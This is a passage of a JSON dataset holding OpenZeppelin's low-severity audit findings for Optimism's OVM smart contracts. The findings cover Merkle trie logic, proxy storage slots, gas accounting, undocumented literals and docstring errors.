      "content": "* The [`getMerkleRoot` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L23) of the `Lib_MerkleTree` library uses assembly to pack elements before hashing them (see [here](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L95-L98) and [here](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_MerkleTree.sol#L84-L87)). Consider using the globally available `abi.encodePacked` function instead.\n* The [`slice` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_BytesUtils.sol#L13) of the `Lib_BytesUtils` library uses assembly to [return a zero-length array](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_BytesUtils.sol#L70-L78). Consider replacing these lines simply returning the empty array `tempBytes`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10744",
      "title": "[L14] Branch node modification in Merkle Trie may deviate from specification",
      "impact": "LOW",
      "content": "The [`_editBranchIndex` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L864) of the `Lib_MerkleTrie` library does not RLP-encode values [if their length is less than 32 bytes](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L875). This behavior does not appear to conform with the [available specification](https://eth.wiki/fundamentals/rlp) for Merkle Trie. Consider either complying with the referenced specification, or alternatively document what specification was used for the implementation of the `Lib_MerkleTrie` library.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10743",
      "title": "[L13] Inconsistent key slicing when computing trie root",
      "impact": "LOW",
      "content": "The [`_getUpdatedTrieRoot` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L482) of the `Lib_MerkleTrie` library is intended to compute a Merkle trie root from a given path to a key-value pair. As it [iterates through the path](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L500), it consumes the corresponding parts of the key by slicing it depending on the type of each node found. Whenever a Leaf or Extension node is found, the key is reduced in size appropriately (see lines [509](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L509) and [513](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L513)), regardless of whether the previous identified node is the last in the path. However, this is not the case for Branch nodes, where the key [is only sliced](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L527) if the previous identified node is not the last in the path.\n\n\nConsider consistently slicing the key when computing the root of Merkle tries.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10742",
      "title": "[L12] Inconsistent and error-prone storage references in proxy contracts",
      "impact": "LOW",
      "content": "There are three different proxy contracts implemented, all of them following a different approach when handling storage references.\n\n\n* The `OVM_ProxySequencerEntrypoint` contract stores the implementation and owner addresses in continuous storage slots at positions 0 and 1 (as can be seen in the [internal getter and setter functions](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_ProxySequencerEntrypoint.sol#L69-L115) for these addresses). While this approach is certainly simple, it can be considered fragile and error-prone. In particular, any poorly constructed implementation that does not take into account the storage layout of the the proxy might accidentally cause a storage collision, and overwrite these two sensitive proxy variables. The problem is aggravated by the fact that the two state variables are not explicitly declared (and therefore visible) in the contract’s state, but rather low-level `ovmSSTORE` and `ovmSLOAD` operations are performed to handle them.\n* The [`OVM_ProxyEOA` contract](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ProxyEOA.sol) stores the implementation address in the storage slot dictated by its [`IMPLEMENTATION_KEY` constant](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ProxyEOA.sol#L23), currently set to `0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddeaddeaddeaddeaddeaddeaddead`.\n* The [`Lib_ResolvedDelegateProxy` contract](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/resolver/Lib_ResolvedDelegateProxy.sol) does not follow either of the previous approaches. Instead, it uses [private mappings](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/resolver/Lib_ResolvedDelegateProxy.sol#L24-L25) in state to [store two addresses](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/resolver/Lib_ResolvedDelegateProxy.sol#L41-L42) corresponding to the `Lib_AddressManager` and implementation contracts, which is said to include a “known flaw” without providing further details.\n\n\nFor a more robust and consistent implementation of proxy contracts, consider always following standardized storage slots for relevant addresses in state. Refer to [EIP 1967](https://eips.ethereum.org/EIPS/eip-1967) for one possible approach. This should allow building common, reusable tooling to facilitate reliable inspection and interaction with all proxy contracts in the system.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10741",
      "title": "[L11] Incorrect state transitioner index",
      "impact": "LOW",
      "content": "When [deploying a new `OVM_StateTransitioner` contract](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L138), the `OVM_FraudVerifier` contract incorrectly passes the index of the state root in its corresponding batch, confusing it with the state root’s index in the State Commitment chain. The same mistake is made when emitting the [`FraudProofInitialized`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L142) and [`FraudProofFinalized`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L215) events.\n\n\nConsider replacing these values with the index of the state root in the State Commitment chain.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10740",
      "title": "[L10] Unnecessary handling of single byte returned data",
      "impact": "LOW",
      "content": "In the `Lib_SafeExecutionManagerWrapper` library, the internal `_safeExecutionManagerInteraction` function handles [a case](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/wrappers/Lib_SafeExecutionManagerWrapper.sol#L354-L357) in which the returned data from a call to the `OVM_ExecutionManager` is a single byte. This code segment appears to be outdated, left over from an earlier version of the system, and it is no longer used.\n\n\nAdditionally, the `ovmEXTCODECOPY` function of the `OVM_ExecutionManager` contract introduces an [artificial manipulation](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L747) to avoid users inadvertently triggering this special case.\n\n\nConsider removing both code segments to favor simplicity and avoid confusion.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10739",
      "title": "[L09] Nuisance gas proportional to code size is charged unnecessarily when changing an account",
      "impact": "LOW",
      "content": "Within the `_checkAccountChange` function of the `OVM_ExecutionManager` contract, nuisance gas is [charged proportional to the code size of the account](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1362-L1363). Since i) it can be assumed that the code deployed in the pre-execution phase of the fraud proof will not change, and ii) nuisance gas proportional to code size is already [charged when initially loading an account for the first time](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1332-L1333), it appears unnecessary to charge nuisance gas again the first time the account (but not its code) is changed.\n\n\nConsider removing the nuisance gas fee associated with contract code size within the `_checkAccountChange` function. Note that the solution to this issue might impact what is described in the informational note **“[N08] Minimum nuisance gas per contract creation is charged twice”**.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10738",
      "title": "[L08] Unspecified behavior of OVM gas refund for revert flags",
      "impact": "LOW",
      "content": "In the `OVM_ExecutionManager` contract, certain [revert flags](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1019-L1022) trigger a refund of OVM gas in the transaction being run. However, there are other flags such as [`EXCEEDS_NUISANCE_GAS`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/iOVM/execution/iOVM_ExecutionManager.sol#L16) and [`UNINITIALIZED_ACCESS`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/iOVM/execution/iOVM_ExecutionManager.sol#L22) which are not taken into account for gas refunds, their expected behavior being unspecified. The `EXCEEDS_NUISANCE_GAS` flag [is raised](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1597) when there is not enough [nuisance gas](https://community.optimism.io/docs/protocol/evm-comparison.html#nuisance-gas) to continue with transaction execution, while the `UNINITIALIZED_ACCESS` flag [is raised](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L241) when the `ovmCALLER` opcode is executed in the transaction’s entrypoint.\n\n\nTo better define the behavior of gas refunds in the OVM, consider specifying if and how gas refunds should be applied for the mentioned revert flags.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10737",
      "title": "[L07] Undocumented literal values",
      "impact": "LOW",
      "content": "Throughout the code base, there are several instances of literal values with unexplained meaning. Moreover, some of them are not declared as constant state variables, which further hinders code readability. Literal values in the code base without an explained meaning make the code harder to read, understand and maintain, thus hindering the experience of developers, auditors and external contributors alike. Following we include a list of literal values that should be further documented and explained.\n\n\nIn `OVM_ExecutionManager.sol`:\n\n\n* Addresses in lines [545](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L545), [826](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L826) and [908](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L908).\n* Fixed gas discounts applied in [line 391](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L391), [line 430](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L430), [line 580](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L580), [line 614](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L614), and [line 649](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L649).\n* Net gas costs applied in [line 681](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L681) and [line 707](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L707).\n* The value 100 on [line 916](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L916).\n\n\nIn `OVM_StateTransitioner.sol`:\n\n\n* The number `100000` in [line 341](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L341).\n\n\nIn `OVM_L1CrossDomainMessenger.sol`:\n\n\n* The number `0` in [line 246](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/messaging/OVM_L1CrossDomainMessenger.sol#L246).\n* The address `0x4200000000000000000000000000000000000000` in [line 254](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/messaging/OVM_L1CrossDomainMessenger.sol#L254).\n* The number `1` in [line 270](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/messaging/OVM_L1CrossDomainMessenger.sol#L270).\n\n\nIn `Lib_MerkleTrie.sol`:\n\n\n* The number `2` in lines [785](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L785) and [811](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L811) should be replaced with [`LEAF_OR_EXTENSION_NODE_LENGTH`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L39).\n\n\nIn `OVM_CanonicalTransactionChain.sol`:\n\n\n* The number `15` in line [627](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L627) should be replaced with [`BATCH_CONTEXT_START_POS`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L47).\n\n\nDevelopers should define a constant variable for every literal value used, giving it a clear and self-explanatory name. Additionally, inline comments explaining how they were calculated or why they were chosen are highly recommended. Following [Solidity’s style guide](https://solidity.readthedocs.io/en/v0.7.6/style-guide.html#constants), constants should be named in `UPPER_CASE_WITH_UNDERSCORES` format, and specific public getters should be defined to read each one of them if appropriate.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10736",
      "title": "[L06] Missing and / or incomplete docstrings",
      "impact": "LOW",
      "content": "Some contracts and functions in the code base lack documentation or include incomplete descriptions. This hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted. Below we list all instances detected during the audit.\n\n\n* All functions of the [`Lib_BytesUtils` library](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_BytesUtils.sol).\n* In the `OVM_CanonicalTransactionChain` contract:\n\n\n\t+ Docstrings for the [`_getBatchExtraData` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L648-L652) are missing two `@return` tags.\n\t+ Docstrings for the [`_getQueueElement` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L742-L746) are missing the [`_queueRef` parameter](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L749).\n\t+ Docstrings for the [`_getSequencerLeafHash` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L797-L803) are missing the [`_hashMemory` parameter](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L808).\n* In the `iOVM_StateCommitmentChain` interface:\n\n\n\t+ Docstrings for the [`verifyStateCommitment` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/iOVM/chain/iOVM_StateCommitmentChain.sol#L88-L93) are missing a `@return` tag.\n* In the `OVM_StateCommitmentChain` contract:\n\n\n\t+ [Docstrings for the constructor](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_StateCommitmentChain.sol#L44-L467) are missing parameters `_fraudProofWindow` and `_sequencerPublishWindow`.\n* In the `OVM_ExecutionManager` contract:\n\n\n\t+ Docstrings for [the constructor](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L81-L83) are missing the `_gasMeterConfig` and `_globalContext` parameters.\n\t+ Docstrings for the [`simulateMessage` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1868-L1873) are missing the `_ovmStateManager` parameter and the returned values.\n* In all [predeploy contracts](https://github.com/ben-chain/contracts-v2/tree/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys), docstrings could include the address at which each contract will be found in Layer 2.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10735",
      "title": "[L05] Misleading and / or erroneous docstrings and comments",
      "impact": "LOW",
      "content": "In the `OVM_CanonicalTransactionChain` contract:\n\n\n* The comment in line [320](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L320) should say “the real queue index” instead of “the real queue length”.\n* The [`@return` tag](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L576) of the `verifyTransaction` function states that the function returns `false` if the transaction does not exist in the Canonical Transaction Chain. However, the function will revert in such scenario.\n* The `@return` tags of the [`_verifySequencerTransaction`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L1107) and [`_verifyQueueTransaction`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L1154) functions state that they return `false`upon failure. Yet in such scenario they revert.\n\n\nIn the `OVM_ExecutionManager` contract:\n\n\n* The [`@return` tag](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L328) of the `ovmL1QUEUEORIGIN` function states that an address is returned, yet the actual [returned value](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L335) is the element of an `enum`.\n* The inline comment in [line 857](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L857) states that the nonce is updated even if contract creation fails, yet that is incorrect. When the contract creation fails with a revert due to the deployer not being allowed, the account’s nonce is not updated (see note **“[N10] Contract creation can revert upon failure”** for additional details).\n* An inline comment in [line 1039](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1039) states that the revert flag *“`EXCEEDS_NUISANCE_GAS` explicitly reduces the remaining nuisance gas for this message to zero”*. However, as can be observed in the related [`_useNuisanceGas` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1589) where the flag is raised, the remaining nuisance gas of the message is not set to zero (as described in issue **“[M05] Nuisance gas left is not reduced to zero when operation exceeds budget”**)\n* An inline comment in [line 1358](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1358) mentions “loading” an account but is referring to changing an account.\n\n\nIn the `Lib_Bytes32Utils` library:\n\n\n* [The `@return` tag](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_Bytes32Utils.sol#L84) of the `removeLeadingZeros` function specifies that the returned value is `bytes32`, while it actually returns a [`bytes`type](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/utils/Lib_Bytes32Utils.sol#L92).\n\n\nIn the `OVM_L1ERC20Gateway` contract:\n\n\n* lines [63 and 64](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/OVM_L1ERC20Gateway.sol#L63-L64) imply that ETH is being deposited, when actually an ERC20 token is being deposited.\n\n\nIn the `Abs_L1TokenGateway` contract:\n\n\n* The comment on line [77](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L1TokenGateway.sol#L77) describes a withdrawal operation instead of a deposit.\n* The comment on line [129](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L1TokenGateway.sol#L129) says “withdrawal” instead of “deposit”.\n* The comment on line [188](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L1TokenGateway.sol#L188) says the function will fail if the L2 withdrawal was not finalized, but that logic is not included within the function.\n\n\nIn the `Abs_L2DepositedToken` contract:\n\n\n* [Docstrings](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L2DepositedToken.sol#L42-L44) for the contract’s constructor should say “L2 Messenger address” instead of “L1 Messenger address”.\n* [Documented parameters](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L2DepositedToken.sol#L215-L216) `_to` and `_amount` of the `finalizeDeposit` function refer to withdrawals, when they should be referring to deposits.\n\n\nIn the `OVM_L2ToL1MessagePasser` contract:\n\n\n* [Docstrings](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_L2ToL1MessagePasser.sol#L15) state that the contract’s runtime target is the EVM, while it should say OVM.\n\n\nIn the `OVM_StateManager` contract:\n\n\n* Docstrings in lines [274](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_StateManager.sol#L274) and [292](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_StateManager.sol#L292) state that the related functions are only called during `ovmCREATE` or `ovmCREATE2` operations, failing to account that they are also called during `ovmCREATEEOA`.\n\n\nIn the `OVM_StateTransitioner` contract:\n\n\n* Docstrings for the [`getPostStateRoot` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L144-L148) state that the value returned corresponds to the *“state root after execution”*. However, if it is called prior to the transaction being applied, the function will return the state root before execution.\n\n\nIn the `Lib_MerkleTrie` library:\n\n\n* Docstrings for the [`_getNodeValue` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L634-L638) should say “Gets the value for a node” instead of “Gets the path for a node”.\n\n\nIn the `OVM_ECDSAContractAccount` contract:\n\n\n* The comment on line [17](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ECDSAContractAccount.sol#L17) indicates that `eth_sign` messages can be parsed, but this functionality has been removed.\n* The comment on line [73](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ECDSAContractAccount.sol#L73) appears to be removable as it is similar to the comment on line [79](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ECDSAContractAccount.sol#L79).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10734",
      "title": "[L04] Merkle tree elements are overwritten",
      "impact": "LOW",
